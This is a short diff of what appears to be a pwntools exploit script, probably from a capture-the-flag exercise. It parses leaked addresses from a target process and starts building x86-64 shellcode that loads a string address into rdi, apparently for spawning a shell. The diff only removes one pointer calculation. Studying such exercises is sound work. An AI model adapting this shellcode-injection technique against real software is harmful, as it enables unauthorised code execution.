@@ -27,8 +27,6 @@ print(f'String address: {hex(string_address)}')
 p.recvuntil(b"My favorite string is at: ")
 shell_code_address = int(p.recvline().strip(), 16)
 print(f'Shell code address: {hex(shell_code_address)}')
-quad_wrd_prt = shell_code_address + 0x38 - (3 * 0x8)
-print(f'Quad word pointer: {hex(quad_wrd_prt)}')
 shell_code = f'''
 mov rdx, 0x0
 lea rdi, [{hex(string_address)}]
